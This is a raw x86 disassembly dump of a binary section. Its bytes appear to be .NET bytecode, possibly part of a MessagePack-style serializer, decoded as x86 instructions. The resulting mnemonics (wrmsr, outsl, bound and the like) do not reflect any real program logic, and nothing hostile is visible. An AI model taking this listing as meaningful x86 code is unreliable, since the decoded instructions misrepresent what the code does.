  403122:	7b 26                	jnp    0x40314a
  403124:	00 00                	add    %al,(%eax)
  403126:	04 06                	add    $0x6,%al
  403128:	6f                   	outsl  %ds:(%esi),(%dx)
  403129:	5d                   	pop    %ebp
  40312a:	00 00                	add    %al,(%eax)
  40312c:	0a 06                	or     (%esi),%al
  40312e:	2a 00                	sub    (%eax),%al
  403130:	1b 30                	sbb    (%eax),%esi
  403132:	02 00                	add    (%eax),%al
  403134:	54                   	push   %esp
  403135:	00 00                	add    %al,(%eax)
  403137:	00 09                	add    %cl,(%ecx)
  403139:	00 00                	add    %al,(%eax)
  40313b:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  403141:	6f                   	outsl  %ds:(%esi),(%dx)
  403142:	5b                   	pop    %ebx
  403143:	00 00                	add    %al,(%eax)
  403145:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403148:	7b 26                	jnp    0x403170
  40314a:	00 00                	add    %al,(%eax)
  40314c:	04 6f                	add    $0x6f,%al
  40314e:	5e                   	pop    %esi
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 0d 2b 20 12 03    	or     0x312202b,%cl
  403157:	28 5f 00             	sub    %bl,0x0(%edi)
  40315a:	00 0a                	add    %cl,(%edx)
  40315c:	13 04 06             	adc    (%esi,%eax,1),%eax
  40315f:	17                   	pop    %ss
  403160:	58                   	pop    %eax
  403161:	0a 08                	or     (%eax),%cl
  403163:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  403166:	22 00                	and    (%eax),%al
  403168:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40316b:	60                   	pusha
  40316c:	00 00                	add    %al,(%eax)
  40316e:	0a 2c 04             	or     (%esp,%eax,1),%ch
  403171:	06                   	push   %es
  403172:	0b de                	or     %esi,%ebx
  403174:	19 12                	sbb    %edx,(%edx)
  403176:	03 28                	add    (%eax),%ebp
  403178:	61                   	popa
  403179:	00 00                	add    %al,(%eax)
  40317b:	0a 2d d7 de 0e 12    	or     0x120eded7,%ch
  403181:	03 fe                	add    %esi,%edi
  403183:	16                   	push   %ss
  403184:	02 00                	add    (%eax),%al
  403186:	00 1b                	add    %bl,(%ebx)
  403188:	6f                   	outsl  %ds:(%esi),(%dx)
  403189:	33 00                	xor    (%eax),%eax
  40318b:	00 0a                	add    %cl,(%edx)
  40318d:	dc 07                	faddl  (%edi)
  40318f:	2a 01                	sub    (%ecx),%al
  403191:	10 00                	adc    %al,(%eax)
  403193:	00 02                	add    %al,(%edx)
  403195:	00 17                	add    %dl,(%edi)
  403197:	00 2d 44 00 0e 00    	add    %ch,0xe0044
  40319d:	00 00                	add    %al,(%eax)
  40319f:	00 13                	add    %dl,(%ebx)
  4031a1:	30 02                	xor    %al,(%edx)
  4031a3:	00 1b                	add    %bl,(%ebx)
  4031a5:	00 00                	add    %al,(%eax)
  4031a7:	00 01                	add    %al,(%ecx)
  4031a9:	00 00                	add    %al,(%eax)
  4031ab:	11 02                	adc    %eax,(%edx)
  4031ad:	03 28                	add    (%eax),%ebp
  4031af:	3b 00                	cmp    (%eax),%eax
  4031b1:	00 06                	add    %al,(%esi)
  4031b3:	0a 06                	or     (%esi),%al
  4031b5:	15 33 02 14 2a       	adc    $0x2a140233,%eax
  4031ba:	02 7b 26             	add    0x26(%ebx),%bh
  4031bd:	00 00                	add    %al,(%eax)
  4031bf:	04 06                	add    $0x6,%al
  4031c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c2:	59                   	pop    %ecx
  4031c3:	00 00                	add    %al,(%eax)
  4031c5:	0a 2a                	or     (%edx),%ch
  4031c7:	00 13                	add    %dl,(%ebx)
  4031c9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4031cc:	ad                   	lods   %ds:(%esi),%eax
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	00 0a                	add    %cl,(%edx)
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	11 02                	adc    %eax,(%edx)
  4031d5:	7b 26                	jnp    0x4031fd
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	04 6f                	add    $0x6f,%al
  4031db:	5a                   	pop    %edx
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4031e1:	1f                   	pop    %ds
  4031e2:	0f 30                	wrmsr
  4031e4:	13 20                	adc    (%eax),%esp
  4031e6:	80 00 00             	addb   $0x0,(%eax)
  4031e9:	00 08                	add    %cl,(%eax)
  4031eb:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  4031ee:	0a 03                	or     (%ebx),%al
  4031f0:	06                   	push   %es
  4031f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031f2:	62 00                	bound  %eax,(%eax)
  4031f4:	00 0a                	add    %cl,(%edx)
  4031f6:	2b 53 08             	sub    0x8(%ebx),%edx
  4031f9:	20 ff                	and    %bh,%bh
  4031fb:	ff 00                	incl   (%eax)
  4031fd:	00 30                	add    %dh,(%eax)
  4031ff:	27                   	daa
  403200:	20 de                	and    %bl,%dh
  403202:	00 00                	add    %al,(%eax)
  403204:	00 0a                	add    %cl,(%edx)
  403206:	03 06                	add    (%esi),%eax
  403208:	6f                   	outsl  %ds:(%esi),(%dx)
  403209:	62 00                	bound  %eax,(%eax)
  40320b:	00 0a                	add    %cl,(%edx)
  40320d:	08 68 28             	or     %ch,0x28(%eax)
  403210:	63 00                	arpl   %eax,(%eax)
  403212:	00 0a                	add    %cl,(%edx)
  403214:	28 26                	sub    %ah,(%esi)
  403216:	00 00                	add    %al,(%eax)
  403218:	06                   	push   %es
  403219:	0b 03                	or     (%ebx),%eax
  40321b:	07                   	pop    %es
  40321c:	16                   	push   %ss
  40321d:	07                   	pop    %es
  40321e:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403221:	4c                   	dec    %esp
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 2b                	or     (%ebx),%ch
  403226:	24 20                	and    $0x20,%al
  403228:	df 00                	filds  (%eax)
  40322a:	00 00                	add    %al,(%eax)
  40322c:	0a 03                	or     (%ebx),%al
  40322e:	06                   	push   %es
  40322f:	6f                   	outsl  %ds:(%esi),(%dx)
  403230:	62 00                	bound  %eax,(%eax)
  403232:	00 0a                	add    %cl,(%edx)
  403234:	08 28                	or     %ch,(%eax)
  403236:	4a                   	dec    %edx
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 28                	or     (%eax),%ch
  40323b:	26 00 00             	add    %al,%es:(%eax)
  40323e:	06                   	push   %es
  40323f:	0b 03                	or     (%ebx),%eax
  403241:	07                   	pop    %es
  403242:	16                   	push   %ss
  403243:	07                   	pop    %es
  403244:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403247:	4c                   	dec    %esp
  403248:	00 00                	add    %al,(%eax)
  40324a:	0a 16                	or     (%esi),%dl
  40324c:	0d 2b 2d 03 02       	or     $0x2032d2b,%eax
  403251:	7b 26                	jnp    0x403279
  403253:	00 00                	add    %al,(%eax)
  403255:	04 09                	add    $0x9,%al
  403257:	6f                   	outsl  %ds:(%esi),(%dx)
  403258:	59                   	pop    %ecx
  403259:	00 00                	add    %al,(%eax)
  40325b:	0a 7b 21             	or     0x21(%ebx),%bh
  40325e:	00 00                	add    %al,(%eax)
  403260:	04 28                	add    $0x28,%al
  403262:	68 00 00 06 02       	push   $0x2060000
  403267:	7b 26                	jnp    0x40328f
  403269:	00 00                	add    %al,(%eax)
  40326b:	04 09                	add    $0x9,%al
  40326d:	6f                   	outsl  %ds:(%esi),(%dx)
  40326e:	59                   	pop    %ecx
  40326f:	00 00                	add    %al,(%eax)
  403271:	0a 03                	or     (%ebx),%al
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	06                   	push   %es
  403278:	09 17                	or     %edx,(%edi)
  40327a:	58                   	pop    %eax
  40327b:	0d 09 08 32 cf       	or     $0xcf320809,%eax
  403280:	2a 00                	sub    (%eax),%al
  403282:	00 00                	add    %al,(%eax)
  403284:	13 30                	adc    (%eax),%esi
  403286:	04 00                	add    $0x0,%al
  403288:	96                   	xchg   %eax,%esi
  403289:	00 00                	add    %al,(%eax)
  40328b:	00 0a                	add    %cl,(%edx)
  40328d:	00 00                	add    %al,(%eax)
  40328f:	11 02                	adc    %eax,(%edx)
  403291:	7b 26                	jnp    0x4032b9
  403293:	00 00                	add    %al,(%eax)
  403295:	04 6f                	add    $0x6f,%al
  403297:	5a                   	pop    %edx
  403298:	00 00                	add    %al,(%eax)
  40329a:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40329d:	1f                   	pop    %ds
  40329e:	0f 30                	wrmsr
  4032a0:	13 20                	adc    (%eax),%esp
  4032a2:	90                   	nop
  4032a3:	00 00                	add    %al,(%eax)
  4032a5:	00 08                	add    %cl,(%eax)
  4032a7:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  4032aa:	0a 03                	or     (%ebx),%al
  4032ac:	06                   	push   %es
  4032ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ae:	62 00                	bound  %eax,(%eax)
  4032b0:	00 0a                	add    %cl,(%edx)
  4032b2:	2b 53 08             	sub    0x8(%ebx),%edx
  4032b5:	20 ff                	and    %bh,%bh
  4032b7:	ff 00                	incl   (%eax)
  4032b9:	00 30                	add    %dh,(%eax)
  4032bb:	27                   	daa
  4032bc:	20 dc                	and    %bl,%ah
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	00 0a                	add    %cl,(%edx)
  4032c2:	03 06                	add    (%esi),%eax
  4032c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c5:	62 00                	bound  %eax,(%eax)
  4032c7:	00 0a                	add    %cl,(%edx)
  4032c9:	08 68 28             	or     %ch,0x28(%eax)
  4032cc:	63 00                	arpl   %eax,(%eax)
  4032ce:	00 0a                	add    %cl,(%edx)
  4032d0:	28 26                	sub    %ah,(%esi)
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	06                   	push   %es
  4032d5:	0b 03                	or     (%ebx),%eax
  4032d7:	07                   	pop    %es
  4032d8:	16                   	push   %ss
  4032d9:	07                   	pop    %es
  4032da:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032dd:	4c                   	dec    %esp
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	0a 2b                	or     (%ebx),%ch
  4032e2:	24 20                	and    $0x20,%al
  4032e4:	dd 00                	fldl   (%eax)
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	0a 03                	or     (%ebx),%al
  4032ea:	06                   	push   %es
  4032eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ec:	62 00                	bound  %eax,(%eax)
  4032ee:	00 0a                	add    %cl,(%edx)
  4032f0:	08 28                	or     %ch,(%eax)
  4032f2:	4a                   	dec    %edx
  4032f3:	00 00                	add    %al,(%eax)
  4032f5:	0a 28                	or     (%eax),%ch
  4032f7:	26 00 00             	add    %al,%es:(%eax)
  4032fa:	06                   	push   %es
  4032fb:	0b 03                	or     (%ebx),%eax
  4032fd:	07                   	pop    %es
  4032fe:	16                   	push   %ss
  4032ff:	07                   	pop    %es
  403300:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403303:	4c                   	dec    %esp
  403304:	00 00                	add    %al,(%eax)
  403306:	0a 16                	or     (%esi),%dl
  403308:	0d 2b 16 02 7b       	or     $0x7b02162b,%eax
  40330d:	26 00 00             	add    %al,%es:(%eax)
  403310:	04 09                	add    $0x9,%al
  403312:	6f                   	outsl  %ds:(%esi),(%dx)
  403313:	59                   	pop    %ecx
  403314:	00 00                	add    %al,(%eax)
  403316:	0a 03                	or     (%ebx),%al
  403318:	6f                   	outsl  %ds:(%esi),(%dx)
  403319:	58                   	pop    %eax
  40331a:	00 00                	add    %al,(%eax)
  40331c:	06                   	push   %es
  40331d:	09 17                	or     %edx,(%edi)
  40331f:	58                   	pop    %eax
  403320:	0d 09 08 32 e6       	or     $0xe6320809,%eax
  403325:	2a 00                	sub    (%eax),%al
  403327:	00 13                	add    %dl,(%ebx)
  403329:	30 02                	xor    %al,(%edx)
  40332b:	00 96 00 00 00 0b    	add    %dl,0xb000000(%esi)
  403331:	00 00                	add    %al,(%eax)
  403333:	11 02                	adc    %eax,(%edx)
  403335:	7b 24                	jnp    0x40335b
  403337:	00 00                	add    %al,(%eax)
  403339:	04 0a                	add    $0xa,%al
  40333b:	06                   	push   %es
  40333c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40333f:	07                   	pop    %es
  403340:	00 00                	add    %al,(%eax)
  403342:	00 1f                	add    %bl,(%edi)
  403344:	00 00                	add    %al,(%eax)
  403346:	00 02                	add    %al,(%edx)
  403348:	00 00                	add    %al,(%eax)
  40334a:	00 13                	add    %dl,(%ebx)
  40334c:	00 00                	add    %al,(%eax)
  40334e:	00 68 00             	add    %ch,0x0(%eax)
  403351:	00 00                	add    %al,(%eax)
  403353:	35 00 00 00 46       	xor    $0x46000000,%eax
  403358:	00 00                	add    %al,(%eax)
  40335a:	00 57 00             	add    %dl,0x0(%edi)
  40335d:	00 00                	add    %al,(%eax)
  40335f:	2b 66 02             	sub    0x2(%esi),%esp
  403362:	7b 23                	jnp    0x403387
  403364:	00 00                	add    %al,(%eax)
  403366:	04 a5                	add    $0xa5,%al
  403368:	51                   	push   %ecx
  403369:	00 00                	add    %al,(%eax)
  40336b:	01 28                	add    %ebp,(%eax)
  40336d:	64 00 00             	add    %al,%fs:(%eax)
  403370:	0a 2a                	or     (%edx),%ch
  403372:	02 7b 23             	add    0x23(%ebx),%bh
  403375:	00 00                	add    %al,(%eax)
  403377:	04 a5                	add    $0xa5,%al
  403379:	52                   	push   %edx
  40337a:	00 00                	add    %al,(%eax)
  40337c:	01 2a                	add    %ebp,(%edx)
  40337e:	02 7b 23             	add    0x23(%ebx),%bh
  403381:	00 00                	add    %al,(%eax)
  403383:	04 6f                	add    $0x6f,%al
  403385:	38 00                	cmp    %al,(%eax)
  403387:	00 0a                	add    %cl,(%edx)
  403389:	6f                   	outsl  %ds:(%esi),(%dx)
  40338a:	65 00 00             	add    %al,%gs:(%eax)
  40338d:	0a 28                	or     (%eax),%ch
  40338f:	66 00 00             	data16 add %al,(%eax)
  403392:	0a 2a                	or     (%edx),%ch
  403394:	02 7b 23             	add    0x23(%ebx),%bh
  403397:	00 00                	add    %al,(%eax)
  403399:	04 a5                	add    $0xa5,%al
  40339b:	53                   	push   %ebx
  40339c:	00 00                	add    %al,(%eax)
  40339e:	01 28                	add    %ebp,(%eax)
  4033a0:	67 00 00             	add    %al,(%bx,%si)
  4033a3:	0a 2a                	or     (%edx),%ch
  4033a5:	02 7b 23             	add    0x23(%ebx),%bh
  4033a8:	00 00                	add    %al,(%eax)
  4033aa:	04 a5                	add    $0xa5,%al
  4033ac:	54                   	push   %esp
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 28                	add    %ebp,(%eax)
  4033b1:	68 00 00 0a 2a       	push   $0x2a0a0000
  4033b6:	02 7b 23             	add    0x23(%ebx),%bh
  4033b9:	00 00                	add    %al,(%eax)
  4033bb:	04 a5                	add    $0xa5,%al
  4033bd:	55                   	push   %ebp
  4033be:	00 00                	add    %al,(%eax)
  4033c0:	01 28                	add    %ebp,(%eax)
  4033c2:	69 00 00 0a 2a 16    	imul   $0x162a0a00,(%eax),%eax
  4033c8:	6a 2a                	push   $0x2a
  4033ca:	00 00                	add    %al,(%eax)
  4033cc:	13 30                	adc    (%eax),%esi
  4033ce:	02 00                	add    (%eax),%al
  4033d0:	96                   	xchg   %eax,%esi
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 0b                	add    %cl,(%ebx)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	11 02                	adc    %eax,(%edx)
  4033d9:	7b 24                	jnp    0x4033ff
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	04 0a                	add    $0xa,%al
  4033df:	06                   	push   %es
  4033e0:	1a 59 45             	sbb    0x45(%ecx),%bl
  4033e3:	07                   	pop    %es
  4033e4:	00 00                	add    %al,(%eax)
  4033e6:	00 1f                	add    %bl,(%edi)
  4033e8:	00 00                	add    %al,(%eax)
  4033ea:	00 02                	add    %al,(%edx)
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	00 0e                	add    %cl,(%esi)
  4033f0:	00 00                	add    %al,(%eax)
  4033f2:	00 68 00             	add    %ch,0x0(%eax)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	35 00 00 00 46       	xor    $0x46000000,%eax
  4033fc:	00 00                	add    %al,(%eax)
  4033fe:	00 57 00             	add    %dl,0x0(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	2b 66 02             	sub    0x2(%esi),%esp
  403406:	7b 23                	jnp    0x40342b
  403408:	00 00                	add    %al,(%eax)
  40340a:	04 a5                	add    $0xa5,%al
  40340c:	51                   	push   %ecx
  40340d:	00 00                	add    %al,(%eax)
  40340f:	01 2a                	add    %ebp,(%edx)
  403411:	02 7b 23             	add    0x23(%ebx),%bh
  403414:	00 00                	add    %al,(%eax)
  403416:	04 a5                	add    $0xa5,%al
  403418:	51                   	push   %ecx
  403419:	00 00                	add    %al,(%eax)
  40341b:	01 28                	add    %ebp,(%eax)
  40341d:	6a 00                	push   $0x0
  40341f:	00 0a                	add    %cl,(%edx)
  403421:	2a 02                	sub    (%edx),%al
  403423:	7b 23                	jnp    0x403448
  403425:	00 00                	add    %al,(%eax)
  403427:	04 6f                	add    $0x6f,%al
  403429:	38 00                	cmp    %al,(%eax)
  40342b:	00 0a                	add    %cl,(%edx)
  40342d:	6f                   	outsl  %ds:(%esi),(%dx)
  40342e:	65 00 00             	add    %al,%gs:(%eax)
  403431:	0a 28                	or     (%eax),%ch
  403433:	6b 00 00             	imul   $0x0,(%eax),%eax
  403436:	0a 2a                	or     (%edx),%ch
  403438:	02 7b 23             	add    0x23(%ebx),%bh
  40343b:	00 00                	add    %al,(%eax)
  40343d:	04 a5                	add    $0xa5,%al
  40343f:	53                   	push   %ebx
  403440:	00 00                	add    %al,(%eax)
  403442:	01 28                	add    %ebp,(%eax)
  403444:	6c                   	insb   (%dx),%es:(%edi)
  403445:	00 00                	add    %al,(%eax)
  403447:	0a 2a                	or     (%edx),%ch
  403449:	02 7b 23             	add    0x23(%ebx),%bh
  40344c:	00 00                	add    %al,(%eax)
  40344e:	04 a5                	add    $0xa5,%al
  403450:	54                   	push   %esp
  403451:	00 00                	add    %al,(%eax)
  403453:	01 28                	add    %ebp,(%eax)
  403455:	6d                   	insl   (%dx),%es:(%edi)
  403456:	00 00                	add    %al,(%eax)
  403458:	0a 2a                	or     (%edx),%ch
  40345a:	02 7b 23             	add    0x23(%ebx),%bh
  40345d:	00 00                	add    %al,(%eax)
  40345f:	04 a5                	add    $0xa5,%al
  403461:	55                   	push   %ebp
  403462:	00 00                	add    %al,(%eax)
  403464:	01 28                	add    %ebp,(%eax)
  403466:	6e                   	outsb  %ds:(%esi),(%dx)
  403467:	00 00                	add    %al,(%eax)
  403469:	0a 2a                	or     (%edx),%ch
  40346b:	16                   	push   %ss
  40346c:	6a 2a                	push   $0x2a
  40346e:	00 00                	add    %al,(%eax)
  403470:	13 30                	adc    (%eax),%esi
  403472:	02 00                	add    (%eax),%al
  403474:	84 00                	test   %al,(%eax)
  403476:	00 00                	add    %al,(%eax)
  403478:	0b 00                	or     (%eax),%eax
  40347a:	00 11                	add    %dl,(%ecx)
  40347c:	02 7b 24             	add    0x24(%ebx),%bh
  40347f:	00 00                	add    %al,(%eax)
  403481:	04 0a                	add    $0xa,%al
  403483:	06                   	push   %es
  403484:	1a 59 45             	sbb    0x45(%ecx),%bl
  403487:	07                   	pop    %es
  403488:	00 00                	add    %al,(%eax)
  40348a:	00 13                	add    %dl,(%ebx)
  40348c:	00 00                	add    %al,(%eax)
  40348e:	00 02                	add    %al,(%edx)
  403490:	00 00                	add    %al,(%eax)
  403492:	00 4f 00             	add    %cl,0x0(%edi)
  403495:	00 00                	add    %al,(%eax)
  403497:	4f                   	dec    %edi
  403498:	00 00                	add    %al,(%eax)
  40349a:	00 24 00             	add    %ah,(%eax,%eax,1)
  40349d:	00 00                	add    %al,(%eax)
  40349f:	30 00                	xor    %al,(%eax)
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	3d 00 00 00 2b       	cmp    $0x2b000000,%eax
  4034a8:	4d                   	dec    %ebp
  4034a9:	02 7b 23             	add    0x23(%ebx),%bh
  4034ac:	00 00                	add    %al,(%eax)
  4034ae:	04 a5                	add    $0xa5,%al
  4034b0:	51                   	push   %ecx
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	01 28                	add    %ebp,(%eax)
  4034b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	0a 2a                	or     (%edx),%ch
  4034ba:	02 7b 23             	add    0x23(%ebx),%bh
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	04 74                	add    $0x74,%al
  4034c1:	39 00                	cmp    %eax,(%eax)
  4034c3:	00 01                	add    %al,(%ecx)
  4034c5:	28 70 00             	sub    %dh,0x0(%eax)
  4034c8:	00 0a                	add    %cl,(%edx)
  4034ca:	2a 02                	sub    (%edx),%al
  4034cc:	7b 23                	jnp    0x4034f1
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 a5                	add    $0xa5,%al
  4034d2:	53                   	push   %ebx
  4034d3:	00 00                	add    %al,(%eax)
  4034d5:	01 2a                	add    %ebp,(%edx)
  4034d7:	02 7b 23             	add    0x23(%ebx),%bh
  4034da:	00 00                	add    %al,(%eax)
  4034dc:	04 a5                	add    $0xa5,%al
  4034de:	54                   	push   %esp
  4034df:	00 00                	add    %al,(%eax)
  4034e1:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  4034e5:	7b 23                	jnp    0x40350a
  4034e7:	00 00                	add    %al,(%eax)
  4034e9:	04 a5                	add    $0xa5,%al
  4034eb:	55                   	push   %ebp
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	01 28                	add    %ebp,(%eax)
  4034f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  4034ff:	2a 13                	sub    (%ebx),%dl
  403501:	30 02                	xor    %al,(%edx)
  403503:	00 a1 00 00 00 0c    	add    %ah,0xc000000(%ecx)
  403509:	00 00                	add    %al,(%eax)
  40350b:	11 02                	adc    %eax,(%edx)
  40350d:	7b 24                	jnp    0x403533
  40350f:	00 00                	add    %al,(%eax)
  403511:	04 0a                	add    $0xa,%al
  403513:	06                   	push   %es
  403514:	1a 59 45             	sbb    0x45(%ecx),%bl
  403517:	08 00                	or     %al,(%eax)
  403519:	00 00                	add    %al,(%eax)
  40351b:	13 00                	adc    (%eax),%eax
  40351d:	00 00                	add    %al,(%eax)
  40351f:	02 00                	add    (%eax),%al
  403521:	00 00                	add    %al,(%eax)
  403523:	6b 00 00             	imul   $0x0,(%eax),%eax
  403526:	00 6b 00             	add    %ch,0x0(%ebx)
  403529:	00 00                	add    %al,(%eax)
  40352b:	24 00                	and    $0x0,%al
  40352d:	00 00                	add    %al,(%eax)
  40352f:	35 00 00 00 46       	xor    $0x46000000,%eax
  403534:	00 00                	add    %al,(%eax)
  403536:	00 5f 00             	add    %bl,0x0(%edi)
  403539:	00 00                	add    %al,(%eax)
  40353b:	2b 69 02             	sub    0x2(%ecx),%ebp
  40353e:	7b 23                	jnp    0x403563
  403540:	00 00                	add    %al,(%eax)
  403542:	04 a5                	add    $0xa5,%al
  403544:	51                   	push   %ecx
  403545:	00 00                	add    %al,(%eax)
  403547:	01 28                	add    %ebp,(%eax)
  403549:	56                   	push   %esi
  40354a:	00 00                	add    %al,(%eax)
  40354c:	0a 2a                	or     (%edx),%ch
  40354e:	02 7b 23             	add    0x23(%ebx),%bh
  403551:	00 00                	add    %al,(%eax)
  403553:	04 6f                	add    $0x6f,%al
  403555:	38 00                	cmp    %al,(%eax)
  403557:	00 0a                	add    %cl,(%edx)
  403559:	28 22                	sub    %ah,(%edx)
  40355b:	00 00                	add    %al,(%eax)
  40355d:	06                   	push   %es
  40355e:	2a 02                	sub    (%edx),%al
  403560:	7b 23                	jnp    0x403585
  403562:	00 00                	add    %al,(%eax)
  403564:	04 a5                	add    $0xa5,%al
  403566:	53                   	push   %ebx
  403567:	00 00                	add    %al,(%eax)
  403569:	01 28                	add    %ebp,(%eax)
  40356b:	57                   	push   %edi
  40356c:	00 00                	add    %al,(%eax)
  40356e:	0a 2a                	or     (%edx),%ch
  403570:	02 7b 23             	add    0x23(%ebx),%bh
  403573:	00 00                	add    %al,(%eax)
  403575:	04 a5                	add    $0xa5,%al
  403577:	54                   	push   %esp
  403578:	00 00                	add    %al,(%eax)
  40357a:	01 28                	add    %ebp,(%eax)
  40357c:	71 00                	jno    0x40357e
  40357e:	00 0a                	add    %cl,(%edx)
  403580:	2a 02                	sub    (%edx),%al
  403582:	7b 23                	jnp    0x4035a7
  403584:	00 00                	add    %al,(%eax)
  403586:	04 a5                	add    $0xa5,%al
  403588:	55                   	push   %ebp
  403589:	00 00                	add    %al,(%eax)
  40358b:	01 0b                	add    %ecx,(%ebx)
  40358d:	12 01                	adc    (%ecx),%al
  40358f:	28 72 00             	sub    %dh,0x0(%edx)
  403592:	00 0a                	add    %cl,(%edx)
  403594:	28 56 00             	sub    %dl,0x0(%esi)
  403597:	00 0a                	add    %cl,(%edx)
  403599:	2a 02                	sub    (%edx),%al
  40359b:	7b 23                	jnp    0x4035c0
  40359d:	00 00                	add    %al,(%eax)
  40359f:	04 74                	add    $0x74,%al
  4035a1:	03 00                	add    (%eax),%eax
  4035a3:	00 1b                	add    %bl,(%ebx)
  4035a5:	2a 16                	sub    (%esi),%dl
  4035a7:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4035ab:	01 2a                	add    %ebp,(%edx)
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	00 13                	add    %dl,(%ebx)
  4035b1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4035b4:	48                   	dec    %eax
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 0d 00 00 11 03    	add    %cl,0x3110000
  4035bd:	28 73 00             	sub    %dh,0x0(%ebx)
  4035c0:	00 0a                	add    %cl,(%edx)
  4035c2:	2c 3e                	sub    $0x3e,%al
  4035c4:	14 0a                	adc    $0xa,%al
  4035c6:	03 19                	add    (%ecx),%ebx
  4035c8:	17                   	pop    %ss
  4035c9:	17                   	pop    %ss
  4035ca:	73 74                	jae    0x403640
  4035cc:	00 00                	add    %al,(%eax)
  4035ce:	0a 0b                	or     (%ebx),%cl
  4035d0:	07                   	pop    %es
  4035d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035d2:	75 00                	jne    0x4035d4
  4035d4:	00 0a                	add    %cl,(%edx)
  4035d6:	d4 8d                	aam    $0x8d
  4035d8:	44                   	inc    %esp
  4035d9:	00 00                	add    %al,(%eax)
  4035db:	01 0a                	add    %ecx,(%edx)
  4035dd:	07                   	pop    %es
  4035de:	06                   	push   %es
  4035df:	16                   	push   %ss
  4035e0:	07                   	pop    %es
  4035e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035e2:	75 00                	jne    0x4035e4
  4035e4:	00 0a                	add    %cl,(%edx)
  4035e6:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4035ed:	07                   	pop    %es
  4035ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4035ef:	76 00                	jbe    0x4035f1
  4035f1:	00 0a                	add    %cl,(%edx)
  4035f3:	07                   	pop    %es
  4035f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f5:	41                   	inc    %ecx
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	0a 02                	or     (%edx),%al
  4035fa:	06                   	push   %es
  4035fb:	28 47 00             	sub    %al,0x0(%edi)
  4035fe:	00 06                	add    %al,(%esi)
  403600:	17                   	pop    %ss
  403601:	2a 16                	sub    (%esi),%dl
  403603:	2a 13                	sub    (%ebx),%dl
  403605:	30 04 00             	xor    %al,(%eax,%eax,1)
  403608:	97                   	xchg   %eax,%edi
  403609:	00 00                	add    %al,(%eax)
  40360b:	00 0e                	add    %cl,(%esi)
  40360d:	00 00                	add    %al,(%eax)
  40360f:	11 02                	adc    %eax,(%edx)
  403611:	0a 03                	or     (%ebx),%al
  403613:	6f                   	outsl  %ds:(%esi),(%dx)
  403614:	65 00 00             	add    %al,%gs:(%eax)
  403617:	0a 19                	or     (%ecx),%bl
  403619:	8d 3a                	lea    (%edx),%edi
  40361b:	00 00                	add    %al,(%eax)
  40361d:	01 25 d0 45 00 00    	add    %esp,0x45d0
  403623:	04 28                	add    $0x28,%al
  403625:	78 00                	js     0x403627
  403627:	00 0a                	add    %cl,(%edx)
  403629:	6f                   	outsl  %ds:(%esi),(%dx)
  40362a:	28 00                	sub    %al,(%eax)
  40362c:	00 0a                	add    %cl,(%edx)
  40362e:	0c 14                	or     $0x14,%al
  403630:	0d 08 8e 2d 02       	or     $0x22d8e08,%eax
  403635:	14 2a                	adc    $0x2a,%al
  403637:	08 8e 69 17 31 36    	or     %cl,0x36311769(%esi)
  40363d:	16                   	push   %ss
  40363e:	13 05 2b 28 08 11    	adc    0x1108282b,%eax
  403644:	05 9a 0d 06 09       	add    $0x9060d9a,%eax
  403649:	6f                   	outsl  %ds:(%esi),(%dx)
  40364a:	3c 00                	cmp    $0x0,%al
  40364c:	00 06                	add    %al,(%esi)
  40364e:	0b 07                	or     (%edi),%eax
